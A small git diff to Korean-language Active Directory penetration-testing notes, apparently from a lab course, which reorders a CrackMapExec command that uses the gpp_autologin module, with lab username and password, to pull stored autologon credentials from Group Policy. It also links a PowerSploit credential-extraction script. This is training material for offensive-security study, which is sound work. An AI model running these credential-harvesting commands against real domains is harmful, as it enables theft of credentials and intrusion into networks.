@@ -836,9 +836,9 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```crackmapexec smb -L | grep gpp```
 
 ### CrackMapExec의 gpp_autologin 모듈 사용
+```crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin```<br/>
 - 참고 : https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin
-- 참고 도구 : https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1<br/>
-```crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin```
+- 참고 도구 : https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1
 
 <br/><br/>
 ## 8. ASREPRoasting
